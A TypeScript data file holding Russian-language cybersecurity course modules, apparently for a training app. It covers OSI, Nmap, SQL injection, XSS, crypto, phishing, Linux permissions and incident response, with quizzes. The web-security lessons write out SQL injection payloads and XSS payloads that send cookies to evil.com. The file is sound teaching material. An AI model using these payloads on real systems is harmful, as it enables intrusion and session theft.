import { Module } from '../types';

export const modules: Module[] = [
  {
    id: 'network-security',
    title: 'Сетевая безопасность',
    description: 'Изучи основы сетевых протоколов, атак и защиты',
    icon: '🌐',
    color: 'from-blue-500 to-cyan-500',
    difficulty: 'Beginner',
    lessons: [
      {
        id: 'net-1',
        title: 'Модель OSI и стек TCP/IP',
        type: 'theory',
        content: `# Модель OSI и TCP/IP

## Что такое модель OSI?

Модель OSI (Open Systems Interconnection) — это концептуальная модель, которая описывает, как различные сетевые протоколы взаимодействуют друг с другом.

### 7 уровней OSI:

| Уровень | Название | Пример протоколов |
|---------|----------|-------------------|
| 7 | Приложений | HTTP, FTP, DNS, SMTP |
| 6 | Представления | SSL/TLS, JPEG |
| 5 | Сеансовый | NetBIOS, PPTP |
| 4 | Транспортный | TCP, UDP |
| 3 | Сетевой | IP, ICMP, ARP |
| 2 | Канальный | Ethernet, Wi-Fi |
| 1 | Физический | Кабели, радиоволны |

## Почему это важно для безопасности?

Атаки происходят на **разных уровнях**:
- **Уровень 2**: ARP-спуфинг, MAC-флудинг
- **Уровень 3**: IP-спуфинг, маршрутизация атак
- **Уровень 4**: SYN-флуд, сканирование портов
- **Уровень 7**: SQL-инъекции, XSS

## TCP Handshake (Трёхстороннее рукопожатие)

\`\`\`
Клиент          Сервер
  |   SYN ---->   |
  |  <---- SYN-ACK|
  |   ACK ---->   |
  |   СОЕДИНЕНИЕ  |
\`\`\`

> **SYN-флуд атака**: злоумышленник отправляет тысячи SYN-пакетов, не завершая handshake — сервер перегружается и падает (DoS).`,
      },
      {
        id: 'net-2',
        title: 'Сканирование портов с Nmap',
        type: 'terminal',
        content: `# Сканирование сетей с Nmap

Nmap (Network Mapper) — мощный инструмент для исследования сети и аудита безопасности.

**Важно**: Сканируй только свои системы или системы с явным разрешением!`,
        terminalChallenge: {
          goal: 'Научись сканировать порты и определять запущенные сервисы',
          description: 'Используй Nmap для исследования целевого хоста 192.168.1.1',
          commands: [
            {
              cmd: 'nmap 192.168.1.1',
              output: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds`,
              hint: 'Базовое сканирование показывает открытые порты'
            },
            {
              cmd: 'nmap -sV -p 22,80,443 192.168.1.1',
              output: `Starting Nmap 7.94
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp  open  http    Apache httpd 2.4.41
443/tcp open  ssl/http Apache httpd 2.4.41
Service detection performed. Please report any incorrect results.`,
              hint: '-sV определяет версии сервисов'
            },
            {
              cmd: 'nmap -sS -O 192.168.1.1',
              output: `Starting Nmap 7.94
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
Running: Linux 5.X
OS details: Linux 5.4 - 5.11
Nmap done: 1 IP address scanned`,
              hint: '-sS это стелс-сканирование SYN, -O определяет ОС'
            },
            {
              cmd: 'nmap --script vuln 192.168.1.1',
              output: `Starting Nmap 7.94
PORT   STATE SERVICE
80/tcp open  http
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|_ Slowloris can slow down Apache
Nmap done: 1 IP address scanned`,
              hint: '--script vuln запускает скрипты поиска уязвимостей'
            }
          ]
        }
      },
      {
        id: 'net-3',
        title: 'Тест: Сетевая безопасность',
        type: 'quiz',
        content: 'Проверь свои знания о сетевой безопасности',
        quiz: [
          {
            id: 'q1',
            question: 'На каком уровне модели OSI работает TCP?',
            options: ['Сетевой (3)', 'Транспортный (4)', 'Приложений (7)', 'Канальный (2)'],
            correctIndex: 1,
            explanation: 'TCP работает на транспортном уровне (уровень 4) модели OSI, обеспечивая надёжную передачу данных.'
          },
          {
            id: 'q2',
            question: 'Что такое SYN-флуд атака?',
            options: [
              'Отправка вредоносных файлов через FTP',
              'Заполнение таблицы MAC-адресов',
              'Отправка большого числа SYN-пакетов без завершения handshake',
              'Перехват DNS-запросов'
            ],
            correctIndex: 2,
            explanation: 'SYN-флуд — это DoS атака, при которой злоумышленник отправляет множество SYN-пакетов, исчерпывая ресурсы сервера незавершёнными соединениями.'
          },
          {
            id: 'q3',
            question: 'Какой флаг Nmap используется для определения версий сервисов?',
            options: ['-O', '-sS', '-sV', '-p'],
            correctIndex: 2,
            explanation: 'Флаг -sV (service version) позволяет Nmap определять версии запущенных сервисов на открытых портах.'
          },
          {
            id: 'q4',
            question: 'ARP-спуфинг — это атака на уровень:',
            options: ['Физический (1)', 'Канальный (2)', 'Сетевой (3)', 'Транспортный (4)'],
            correctIndex: 1,
            explanation: 'ARP (Address Resolution Protocol) работает на канальном уровне (уровень 2), поэтому ARP-спуфинг — атака на уровень 2.'
          }
        ]
      }
    ]
  },
  {
    id: 'web-security',
    title: 'Безопасность веб-приложений',
    description: 'OWASP Top 10: XSS, SQL-инъекции, CSRF и другие атаки',
    icon: '🔒',
    color: 'from-red-500 to-orange-500',
    difficulty: 'Intermediate',
    lessons: [
      {
        id: 'web-1',
        title: 'SQL-инъекции',
        type: 'theory',
        content: `# SQL-инъекции

## Что такое SQL-инъекция?

SQL-инъекция — одна из самых распространённых уязвимостей. Злоумышленник вставляет вредоносный SQL-код через форму ввода.

## Уязвимый код:

\`\`\`python
# ОПАСНО! Никогда так не делай
username = request.form['username']
query = "SELECT * FROM users WHERE username = '" + username + "'"
db.execute(query)
\`\`\`

## Атака:

Если ввести: \`admin' OR '1'='1\`

Запрос становится:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
\`\`\`

Условие \`'1'='1'\` всегда истинно — обходим аутентификацию!

## Другие опасные пейлоады:

\`\`\`sql
-- Получить все данные
' OR 1=1--

-- Удалить таблицу (DROP TABLE)
'; DROP TABLE users;--

-- Вывести версию БД
' UNION SELECT version(),null,null--

-- Получить файл системы (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),null--
\`\`\`

## Защита — Параметризованные запросы:

\`\`\`python
# БЕЗОПАСНО — используй параметры
query = "SELECT * FROM users WHERE username = ?"
db.execute(query, (username,))

# Или ORM (SQLAlchemy)
user = User.query.filter_by(username=username).first()
\`\`\`

## Инструменты для тестирования:
- **sqlmap** — автоматическое обнаружение SQL-инъекций
- **Burp Suite** — перехват и изменение HTTP-запросов`,
      },
      {
        id: 'web-2',
        title: 'XSS — межсайтовый скриптинг',
        type: 'theory',
        content: `# XSS (Cross-Site Scripting)

## Типы XSS:

### 1. Reflected XSS (Отражённый)
Скрипт передаётся в URL и сразу выполняется.

\`\`\`
https://example.com/search?q=<script>alert('XSS')</script>
\`\`\`

### 2. Stored XSS (Хранимый) — самый опасный!
Скрипт сохраняется в базе данных и выполняется у каждого посетителя.

\`\`\`javascript
// Злоумышленник вводит в комментарий:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
\`\`\`

### 3. DOM-based XSS
Уязвимость в JavaScript на клиенте.

\`\`\`javascript
// Опасный код:
document.getElementById('output').innerHTML = location.hash.slice(1);
// URL: https://example.com/#<img src=x onerror=alert(1)>
\`\`\`

## Реальные пайлоады XSS:

\`\`\`javascript
// Базовый
<script>alert('XSS')</script>

// Кража cookies
<script>document.location='http://evil.com/?c='+document.cookie</script>

// Обход фильтров
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
javascript:alert(1)
\`\`\`

## Защита:

\`\`\`python
# 1. Экранирование HTML
from markupsafe import escape
safe_output = escape(user_input)

# 2. Content Security Policy (CSP)
# В заголовках HTTP:
Content-Security-Policy: default-src 'self'; script-src 'self'

# 3. HttpOnly cookies (не доступны из JS)
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
\`\`\``,
      },
      {
        id: 'web-3',
        title: 'Тест: Веб-безопасность',
        type: 'quiz',
        content: 'Проверь свои знания об атаках на веб-приложения',
        quiz: [
          {
            id: 'wq1',
            question: 'Какой пейлоад позволяет обойти авторизацию через SQL-инъекцию?',
            options: [
              "<script>alert(1)</script>",
              "' OR '1'='1",
              "../../../etc/passwd",
              "{{7*7}}"
            ],
            correctIndex: 1,
            explanation: "' OR '1'='1 делает условие WHERE всегда истинным, что позволяет войти без пароля."
          },
          {
            id: 'wq2',
            question: 'Какой тип XSS наиболее опасен, так как хранится в базе данных?',
            options: ['Reflected XSS', 'DOM-based XSS', 'Stored XSS', 'Blind XSS'],
            correctIndex: 2,
            explanation: 'Stored XSS (хранимый) самый опасный — вредоносный скрипт сохраняется в БД и атакует каждого посетителя.'
          },
          {
            id: 'wq3',
            question: 'Что такое параметризованные запросы?',
            options: [
              'Способ ускорить SQL запросы',
              'Метод защиты от SQL-инъекций через разделение кода и данных',
              'Тип шифрования базы данных',
              'Способ кэширования запросов'
            ],
            correctIndex: 1,
            explanation: 'Параметризованные запросы разделяют SQL-код и данные, не позволяя пользовательскому вводу изменить структуру запроса.'
          },
          {
            id: 'wq4',
            question: 'Что делает флаг HttpOnly в cookie?',
            options: [
              'Разрешает доступ к cookie только по HTTPS',
              'Запрещает JavaScript доступ к cookie',
              'Шифрует значение cookie',
              'Ограничивает cookie одним доменом'
            ],
            correctIndex: 1,
            explanation: 'HttpOnly запрещает JavaScript читать cookie через document.cookie, защищая от XSS-атак кражи сессий.'
          },
          {
            id: 'wq5',
            question: 'Какой HTTP-заголовок защищает от XSS через политику источников?',
            options: ['X-Frame-Options', 'Content-Security-Policy', 'Strict-Transport-Security', 'X-Content-Type-Options'],
            correctIndex: 1,
            explanation: 'Content-Security-Policy (CSP) позволяет указать, какие источники скриптов разрешены, предотвращая выполнение вредоносного JS.'
          }
        ]
      }
    ]
  },
  {
    id: 'cryptography',
    title: 'Криптография',
    description: 'Шифрование, хэширование, цифровые подписи и PKI',
    icon: '🔑',
    color: 'from-purple-500 to-pink-500',
    difficulty: 'Intermediate',
    lessons: [
      {
        id: 'crypto-1',
        title: 'Симметричное vs Асимметричное шифрование',
        type: 'theory',
        content: `# Криптография: Основы

## Симметричное шифрование

Один ключ для шифрования И дешифрования.

\`\`\`
Отправитель              Получатель
[Данные] --[Ключ K]--> [Зашифровано] --[Ключ K]--> [Данные]
\`\`\`

**Алгоритмы:**
- **AES-256** — стандарт индустрии, используется повсеместно
- **ChaCha20** — для мобильных устройств
- **3DES** — устарел, не рекомендуется

**Преимущества:** Очень быстрое (в 1000 раз быстрее асимметричного)
**Проблема:** Как безопасно передать ключ?

## Асимметричное шифрование (PKI)

Два математически связанных ключа: **публичный** и **приватный**.

\`\`\`
Боб публикует публичный ключ: 🔓
Алиса шифрует им сообщение → только Боб может расшифровать 🔐

Боб подписывает приватным ключом → все могут проверить публичным
\`\`\`

**Алгоритмы:**
- **RSA-2048/4096** — классика, медленное
- **ECDSA** — на эллиптических кривых, компактнее
- **Ed25519** — современный стандарт для SSH ключей

## Хэш-функции

Односторонняя функция: данные → фиксированный хэш.

\`\`\`python
import hashlib

data = "password123"
# MD5 (УСТАРЕЛ, не используй для паролей!)
md5 = hashlib.md5(data.encode()).hexdigest()
# "482c811da5d5b4bc6d497ffa98491e38"

# SHA-256 (безопасен для целостности файлов)
sha256 = hashlib.sha256(data.encode()).hexdigest()
# "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"

# bcrypt (для хранения паролей!)
import bcrypt
hashed = bcrypt.hashpw(data.encode(), bcrypt.gensalt())
\`\`\`

## HTTPS = HTTP + TLS

TLS использует оба типа:
1. **Асимметричное** для обмена сессионным ключом (handshake)
2. **Симметричное** для шифрования трафика (быстро)`,
      },
      {
        id: 'crypto-2',
        title: 'Тест: Криптография',
        type: 'quiz',
        content: 'Проверь знания криптографии',
        quiz: [
          {
            id: 'cq1',
            question: 'Какой алгоритм шифрования является современным стандартом для симметричного шифрования?',
            options: ['DES', 'MD5', 'AES-256', 'RSA'],
            correctIndex: 2,
            explanation: 'AES-256 (Advanced Encryption Standard) — современный стандарт симметричного шифрования, одобренный NIST.'
          },
          {
            id: 'cq2',
            question: 'Зачем хэш-функции используют "соль" (salt) при хранении паролей?',
            options: [
              'Для ускорения хэширования',
              'Для сжатия данных',
              'Для защиты от радужных таблиц и атак повторного использования',
              'Для шифрования хэша'
            ],
            correctIndex: 2,
            explanation: 'Соль — случайные данные, добавляемые к паролю перед хэшированием. Делает одинаковые пароли разными хэшами, предотвращая атаки с предвычисленными таблицами.'
          },
          {
            id: 'cq3',
            question: 'В чём основная проблема симметричного шифрования?',
            options: [
              'Оно медленнее асимметричного',
              'Безопасная передача ключа обеим сторонам',
              'Ключ слишком короткий',
              'Оно не поддерживает шифрование файлов'
            ],
            correctIndex: 1,
            explanation: 'Проблема симметричного шифрования — безопасная передача общего секретного ключа. Для этого используется асимметричное шифрование (протокол Diffie-Hellman).'
          }
        ]
      }
    ]
  },
  {
    id: 'social-engineering',
    title: 'Социальная инженерия',
    description: 'Фишинг, претекстинг, вишинг — атаки на людей',
    icon: '🎭',
    color: 'from-yellow-500 to-amber-500',
    difficulty: 'Beginner',
    lessons: [
      {
        id: 'se-1',
        title: 'Фишинг и его виды',
        type: 'theory',
        content: `# Социальная инженерия

## Что это?

Атаки на **человека**, а не на технологии. 90% кибератак начинаются с социальной инженерии.

## Виды атак:

### 🎣 Фишинг (Phishing)
Массовые поддельные письма.

\`\`\`
От: support@paypa1.com  ← Замети подмену буквы!
Тема: Ваш аккаунт заморожен!

Срочно войдите: http://paypa1-secure.ru/login
\`\`\`

### 🎯 Спир-фишинг (Spear Phishing)
Целевые атаки с персонализацией.

\`\`\`
От: ceo@company.com
Кому: бухгалтер

Привет, Анна! Мне нужно срочно перевести $50,000
на новый счёт поставщика. Реквизиты: ...
\`\`\`

### 📞 Вишинг (Vishing)
Голосовой фишинг по телефону.

\`\`\`
"Добрый день, это служба безопасности банка.
Ваша карта заблокирована. Назовите CVV код
для подтверждения личности..."
\`\`\`

### 📱 Смишинг (Smishing)
Фишинг через SMS.

## Психологические триггеры:

| Триггер | Пример |
|---------|--------|
| **Срочность** | "Только 5 минут!" |
| **Авторитет** | "Это ФСБ/налоговая" |
| **Страх** | "Ваш аккаунт взломан" |
| **Жадность** | "Вы выиграли миллион!" |
| **Доверие** | Имитация коллег/друзей |

## Как защититься:

1. **Проверяй отправителя** — hover над email-адресом
2. **Не переходи по ссылкам** из писем — открывай сайт вручную
3. **Звони напрямую** — перезвони по официальному номеру
4. **MFA/2FA** — даже если пароль украли, нужен второй фактор
5. **Обучение** — регулярные тренировочные фишинг-кампании`,
      },
      {
        id: 'se-2',
        title: 'Тест: Социальная инженерия',
        type: 'quiz',
        content: 'Можешь ли ты распознать атаки социальной инженерии?',
        quiz: [
          {
            id: 'sq1',
            question: 'Ты получил письмо от "CEO компании" с просьбой срочно перевести деньги. Что делать?',
            options: [
              'Немедленно перевести — CEO не ждёт',
              'Позвонить CEO по официальному номеру для подтверждения',
              'Ответить на письмо с уточнением деталей',
              'Переслать письмо в бухгалтерию'
            ],
            correctIndex: 1,
            explanation: 'BEC (Business Email Compromise) — распространённая атака. Всегда верифицируй финансовые запросы по альтернативному каналу (звонок по известному номеру).'
          },
          {
            id: 'sq2',
            question: 'Какой психологический триггер используется во фразе "Только 2 часа! Ваш приз ждёт!"?',
            options: ['Авторитет', 'Страх', 'Срочность + Жадность', 'Доверие'],
            correctIndex: 2,
            explanation: 'Комбинация срочности ("только 2 часа") и жадности ("приз ждёт") давит на человека, заставляя действовать без раздумий.'
          },
          {
            id: 'sq3',
            question: 'Почему 2FA/MFA важна против фишинга?',
            options: [
              'Делает пароль длиннее',
              'Шифрует трафик',
              'Даже украденный пароль бесполезен без второго фактора',
              'Блокирует фишинговые сайты'
            ],
            correctIndex: 2,
            explanation: 'MFA требует второй фактор (SMS-код, приложение-аутентификатор), который злоумышленник не получит, даже зная пароль жертвы.'
          }
        ]
      }
    ]
  },
  {
    id: 'linux-security',
    title: 'Linux & Командная строка',
    description: 'Права доступа, логи, процессы и харденинг Linux',
    icon: '🐧',
    color: 'from-green-500 to-emerald-500',
    difficulty: 'Intermediate',
    lessons: [
      {
        id: 'linux-1',
        title: 'Права доступа в Linux',
        type: 'terminal',
        content: `# Права доступа в Linux

Понимание прав доступа критично для системной безопасности.`,
        terminalChallenge: {
          goal: 'Освоить управление правами доступа в Linux',
          description: 'Изучи систему прав доступа файловой системы Linux',
          commands: [
            {
              cmd: 'ls -la /etc/passwd',
              output: `-rw-r--r-- 1 root root 2847 Jun 15 10:23 /etc/passwd
# rw-r--r-- = владелец:rw, группа:r, остальные:r`,
              hint: 'ls -la показывает права в формате rwx'
            },
            {
              cmd: 'stat /etc/shadow',
              output: `  File: /etc/shadow
  Size: 1024
Access: (0640/-rw-r-----)
  Uid: (    0/    root)
  Gid: (   42/  shadow)
# Только root и группа shadow могут читать!`,
              hint: '/etc/shadow содержит хэши паролей — строго ограничен'
            },
            {
              cmd: 'chmod 700 secret.sh && ls -la secret.sh',
              output: `-rwx------ 1 user user 512 Jun 15 10:30 secret.sh
# Только владелец может читать, писать, выполнять`,
              hint: 'chmod 700 = 111 000 000 в двоичном = rwx------'
            },
            {
              cmd: 'find / -perm -4000 -type f 2>/dev/null',
              output: `/usr/bin/passwd
/usr/bin/sudo
/usr/bin/su
/usr/sbin/mount.cifs
# SUID файлы выполняются с правами владельца!
# Могут быть вектором атаки при неправильной настройке`,
              hint: '-perm -4000 ищет файлы с SUID битом — потенциальные векторы привилегий'
            },
            {
              cmd: 'ps aux | grep -E "root.*www|apache|nginx"',
              output: `root  1234  0.0  0.1  nginx: master process
www-data 1235 0.0 0.2  nginx: worker process
# Хорошо: master как root, worker как www-data
# Плохо: если веб-сервер полностью запущен от root`,
              hint: 'Веб-серверы должны работать с минимальными правами'
            }
          ]
        }
      },
      {
        id: 'linux-2',
        title: 'Тест: Linux безопасность',
        type: 'quiz',
        content: 'Тест по безопасности Linux',
        quiz: [
          {
            id: 'lq1',
            question: 'Что означают права доступа 755 в Linux?',
            options: [
              'rwxrwxrwx — все могут всё',
              'rwxr-xr-x — владелец всё, остальные читают и запускают',
              'rw-rw-rw- — все читают и пишут',
              'rwx------ — только владелец'
            ],
            correctIndex: 1,
            explanation: '755 = 7(rwx) 5(r-x) 5(r-x): владелец имеет все права, группа и остальные — только чтение и выполнение.'
          },
          {
            id: 'lq2',
            question: 'Почему SUID бит на исполняемых файлах является потенциальной угрозой?',
            options: [
              'Замедляет файловую систему',
              'Файл выполняется с правами владельца (часто root), а не запускающего пользователя',
              'Делает файл невидимым',
              'Блокирует запись файла'
            ],
            correctIndex: 1,
            explanation: 'SUID бит позволяет выполнять файл с правами его владельца. Если SUID-файл принадлежит root и содержит уязвимость — злоумышленник получает root-доступ.'
          }
        ]
      }
    ]
  },
  {
    id: 'incident-response',
    title: 'Реагирование на инциденты',
    description: 'Обнаружение атак, форензика и восстановление систем',
    icon: '🚨',
    color: 'from-red-600 to-rose-500',
    difficulty: 'Advanced',
    lessons: [
      {
        id: 'ir-1',
        title: 'Цикл реагирования на инциденты',
        type: 'theory',
        content: `# Реагирование на инциденты (IR)

## NIST Framework: 4 фазы

### 1. 🔍 Подготовка (Preparation)
- Разработка IR-плана
- Обучение команды
- Настройка SIEM, IDS/IPS
- Инвентаризация активов

### 2. 🎯 Обнаружение & Анализ (Detection & Analysis)
- Мониторинг логов и алертов
- Классификация инцидента
- Определение масштаба

### 3. 🛡️ Сдерживание, Ликвидация & Восстановление
**Краткосрочное сдерживание:**
\`\`\`bash
# Изолировать зараженный хост
iptables -I INPUT -s 192.168.1.100 -j DROP
iptables -I OUTPUT -d 192.168.1.100 -j DROP

# Или отключить от сети
nmcli device disconnect eth0
\`\`\`

**Ликвидация:**
- Удаление малвари
- Закрытие уязвимости
- Сброс скомпрометированных учётных данных

### 4. 📋 Постинцидентный анализ (Lessons Learned)
- Что произошло?
- Как атаковали?
- Что сделали правильно/неправильно?
- Как предотвратить повтор?

## Индикаторы компрометации (IoC):

\`\`\`bash
# Подозрительные соединения
netstat -tulpn | grep ESTABLISHED
ss -tulpn

# Необычные процессы
ps aux --sort=-%cpu | head -20
lsof -i

# Изменённые файлы (за последние 24 часа)
find /etc /bin /usr -mtime -1 -type f

# Подозрительные cron-задачи
crontab -l
ls -la /etc/cron*
cat /etc/crontab
\`\`\`

## MITRE ATT&CK Framework

Матрица тактик и техник реальных злоумышленников:
- **Initial Access** → Spearphishing, Exploits
- **Execution** → Scripts, Malicious Links
- **Persistence** → Cron, Registry, Startup
- **Privilege Escalation** → SUID, Sudo abuse
- **Exfiltration** → DNS tunneling, HTTPS`,
      },
      {
        id: 'ir-2',
        title: 'Тест: Реагирование на инциденты',
        type: 'quiz',
        content: 'Тест по реагированию на инциденты',
        quiz: [
          {
            id: 'iq1',
            question: 'Каков правильный порядок фаз NIST IR Framework?',
            options: [
              'Обнаружение → Подготовка → Сдерживание → Анализ',
              'Подготовка → Обнаружение → Сдерживание/Ликвидация → Анализ',
              'Анализ → Подготовка → Обнаружение → Восстановление',
              'Сдерживание → Подготовка → Обнаружение → Анализ'
            ],
            correctIndex: 1,
            explanation: 'NIST SP 800-61: Подготовка → Обнаружение & Анализ → Сдерживание, Ликвидация & Восстановление → Постинцидентная деятельность.'
          },
          {
            id: 'iq2',
            question: 'Что такое IoC (Indicators of Compromise)?',
            options: [
              'Инструменты шифрования трафика',
              'Артефакты, указывающие на возможную компрометацию системы',
              'Тип сетевого протокола',
              'Методология тестирования на проникновение'
            ],
            correctIndex: 1,
            explanation: 'IoC — это цифровые артефакты (IP-адреса, хэши файлов, домены, сигнатуры), свидетельствующие о возможной кибератаке или взломе системы.'
          },
          {
            id: 'iq3',
            question: 'Какая команда Linux поможет найти файлы, изменённые за последние 24 часа?',
            options: [
              'ls -la /etc',
              'find / -mtime -1 -type f',
              'grep -r "modified" /var/log',
              'stat /etc/*'
            ],
            correctIndex: 1,
            explanation: 'find / -mtime -1 ищет файлы, изменённые за последние 24 часа (-1 = меньше 1 дня). Полезно для обнаружения следов атаки.'
          }
        ]
      }
    ]
  }
];
